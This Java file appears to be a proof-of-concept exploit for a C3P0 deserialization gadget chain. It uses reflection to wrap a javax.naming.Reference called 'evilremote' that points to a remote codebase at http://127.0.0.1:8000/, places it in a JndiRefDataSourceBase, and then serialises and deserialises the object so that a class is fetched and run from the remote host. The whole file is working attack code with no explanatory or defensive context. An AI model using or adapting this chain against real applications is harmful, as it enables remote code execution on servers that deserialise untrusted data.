package C3P0;

import com.mchange.v2.c3p0.impl.JndiRefDataSourceBase;
import com.mchange.v2.naming.ReferenceIndirector;

import javax.naming.Reference;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class c3p0_urlclassloader {
    public static void main(String[] args) throws Exception {
        Reference ref = new Reference("evilremote","evilremote","http://127.0.0.1:8000/");
        ReferenceIndirector indir = new ReferenceIndirector();

        Class refser_class = indir.getClass().getDeclaredClasses()[0];
        Constructor<?> indirector = refser_class.getDeclaredConstructors()[0];
        indirector.setAccessible(true);
        Object refser = indirector.newInstance(ref, null, null, null);


        JndiRefDataSourceBase jndiRefDataSourceBase = new JndiRefDataSourceBase(false);
        setField(jndiRefDataSourceBase,"jndiName",refser);
        writeObject(jndiRefDataSourceBase);
        readObject("ser.bin");
    }

    public static void setField(Object obj, String fieldName, Object newValue) {
        try {
            Class<?> clazz = obj.getClass();
            Field field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, newValue);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public static void writeObject(Object obj) throws IOException {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"))) {
            oos.writeObject(obj);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Object readObject(String filename) {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
            return ois.readObject();
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }


}
